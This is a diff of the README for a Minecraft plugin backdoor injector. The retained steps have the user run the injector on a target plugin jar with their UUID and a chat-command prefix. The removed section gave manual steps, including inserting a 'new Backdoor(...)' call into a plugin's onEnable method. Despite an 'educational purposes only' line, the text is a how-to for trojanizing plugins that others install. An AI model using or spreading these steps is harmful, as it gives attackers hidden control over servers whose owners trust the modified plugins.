@@ -10,37 +10,15 @@ Using the injector is recommended, should you choose to manually backdoor a plug
 For educational purposes only. Do not use on a server you do not own.
 
 ## Requirements:
-### Injector:
 * Java 8 runtime.
 * Desired target plugin jar file.
 * Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
-### Manual Injection:
-* Java 8 JDK.
-* Desired plugin source code.
-* Plugin dependencies.
-* Your Minecraft UUID. (You can find your UUID at: [NameMC](https://www.NameMC.com))
-## Usage instructions:
 
-### Injector:
+## Usage instructions:
 * Run backdoor-(version).jar.
 * Select desired plugin file.
 * Input your Minecraft UUID.
 * Input chat command prefix. (Default: #)
-
-### Manual Injection:
-
-* Download source code for desired plugin, and open in editor of your choice.
-* Merge ``com.thiccindustries.debugger`` folder into the plugin's source.
-* Open the Plugin's main source file, The file's class definition should look like this: 
-``public class Something extends JavaPlugin{}``
-* Add the following line to the top of the file:
-``import com.thiccindustries.debugger``
-* Find the ``@Override public void onEnable(){}`` method.
-* Add the following line to the beginning of the method:
-``new Backdoor(this, new String[]{"[Your UUID Here]"}, [Your Chat Prefix Here]);``
-> Note: Add multiple UUIDs by separating multiple "[uuid]" entries by commas.
-* Change other configuration options in Config.java as desired.
-* Compile plugin.
 
 ## Commands
 Default command prefix is ``#``,  this can be changed.
